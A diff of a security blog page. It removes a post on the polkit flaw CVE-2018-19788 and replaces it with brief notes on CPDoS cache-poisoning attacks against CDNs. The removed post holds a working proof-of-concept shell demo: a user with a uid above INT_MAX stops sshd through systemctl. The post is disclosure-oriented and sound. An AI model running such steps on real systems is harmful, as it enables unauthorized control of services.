@@ -5,13 +5,13 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <title>Critical vulnerability on policykit of systemd</title>
-    <meta name="description" content="[CVE-2018-19788]: A flaw was found in PolicyKit (aka polkit 0.115) that allows a user with a uid greater than INT_MAX to successfully execute any systemctl c...">
+    <title>Notes on CPDOS attack CDN</title>
+    <meta name="description" content="Sending malicious HTTP requests (including overside header, meta char, method override header) to CDNs endpoint --&gt; these kind of requests are not detecte...">
 
     <!-- todo: include this into main.css -->
     <link href='https://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'>
     <link rel="stylesheet" href=" /css/main.css ">
-    <link rel="canonical" href="https://blog.tracelog.in/security/2018/12/05/Critial-vulnerability-on-policykit-of-systemd.html">
+    <link rel="canonical" href="https://blog.tracelog.in/technical/security/2019/10/23/Notes-on-CPDOS-attack-CDNs.html">
     <link rel="alternate" type="application/rss+xml" title="Hieu's blog" href="https://blog.tracelog.in /feed.xml ">
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <script async src="https://blog.tracelog.in/assets/dist/fetch.min.js"></script>
@@ -89,48 +89,33 @@
             <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
 
   <header class="article_header">
-    <h1 class="special_title" itemprop="name headline">Critical vulnerability on policykit of systemd</h1>
-    <time class="post_date">Published on Wednesday 05 December 2018 - 2 min read</time>
+    <h1 class="special_title" itemprop="name headline">Notes on CPDOS attack CDN</h1>
+    <time class="post_date">Published on Wednesday 23 October 2019 - 1 min read</time>
   </header>
 
   <div class="article-content" itemprop="articleBody">
-    <p><strong>[CVE-2018-19788]</strong>: A flaw was found in PolicyKit (aka <code class="highlighter-rouge">polkit 0.115</code>) that allows a user with a uid greater than <code class="highlighter-rouge">INT_MAX</code> to successfully execute any <code class="highlighter-rouge">systemctl</code> command.</p>
-<ul>
-  <li><a href="https://github.com/systemd/systemd/issues/11026">https://github.com/systemd/systemd/issues/11026</a></li>
-  <li><a href="https://github.com/freedesktop/polkit/blob/8c1bc8a/src/programs/pkttyagent.c#L156">https://github.com/freedesktop/polkit/blob/8c1bc8a/src/programs/pkttyagent.c#L156</a></li>
-  <li><a href="https://gitlab.freedesktop.org/polkit/polkit/issues/74">https://gitlab.freedesktop.org/polkit/polkit/issues/74</a></li>
-</ul>
-
-<p>Find out more about CVE-2018-19788 from the <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19788">MITRE CVE</a> dictionary and <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-19788">NIST NVD</a></p>
-
-<p><img src="/assets/img/CVE-2018-19788.webp" alt="" /></p>
-
-<!--description-->
-
-<h2 id="demo">DEMO</h2>
-
-<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">root@ahihi:~# </span>useradd -u 4000000000 wtf
-<span class="gp">root@ahihi:~# </span>su - wtf
-No directory, logging <span class="k">in </span>with <span class="nv">HOME</span><span class="o">=</span>/
-
-<span class="gp">$ </span>whoami
-wtf
-<span class="gp">$ </span>id
-<span class="nv">uid</span><span class="o">=</span>4000000000<span class="o">(</span>wtf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>wtf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>wtf<span class="o">)</span>
-
-<span class="gp">$ </span>systemctl stop sshd.service
-
-<span class="o">(</span>process:22860<span class="o">)</span>: GLib-GObject-WARNING <span class="k">**</span>: value <span class="s2">"-294967296"</span> of <span class="nb">type</span> <span class="s1">'gint'</span> is invalid or out of range <span class="k">for </span>property <span class="s1">'uid'</span> of <span class="nb">type</span> <span class="s1">'gint'</span>
-<span class="k">**</span>
-ERROR:pkttyagent.c:175:main: assertion failed: <span class="o">(</span>polkit_unix_process_get_uid <span class="o">(</span>POLKIT_UNIX_PROCESS <span class="o">(</span>subject<span class="o">))</span> &gt;<span class="o">=</span> 0<span class="o">)</span>
-
-<span class="gp">root@ahihi:~# </span>systemctl status sshd.service
-...
-Dec 05 15:38:39 ahihi systemd[1]: Stopping OpenBSD Secure Shell server...
-Dec 05 15:38:39 ahihi systemd[1]: Stopped OpenBSD Secure Shell server.
+    <div class="highlighter-rouge"><pre class="highlight"><code>Sending malicious HTTP requests (including overside header, meta char, method override header) to CDNs endpoint 
+--&gt; these kind of requests are not detected by caching system, are processed by intermediate CDN caching system 
+--&gt; then forward to the origin server 
+--&gt; origin return server-generated error page 
+--&gt; CDN stored error page on edge 
+--&gt; CDN serves the same error for normal requests from end-user
 </code></pre>
 </div>
 
+<p>Main impact: AWS Cloudfront (<strong>FIXED</strong>)</p>
+
+<!--description-->
+
+<p><img src="/assets/img/CPDoS.png" alt="img" title="CPDOS attack CDN" /></p>
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li>Site: <a href="https://cpdos.org">https://cpdos.org</a></li>
+  <li>Paper: <a href="https://cpdos.org/paper/Your_Cache_Has_Fallen__Cache_Poisoned_Denial_of_Service_Attack__Preprint_.pdf">PDF</a></li>
+  <li>Reported to HTTP implementation vendors and cache providers on February 19, 2019</li>
+</ul>
 
     <div id="gitment-container"></div>
     <script async src="https://comments.app/js/widget.js?2" data-comments-app-website="iVXMIkzG" data-limit="10" data-color="E47911" data-dislikes="1" data-colorful="1"></script>
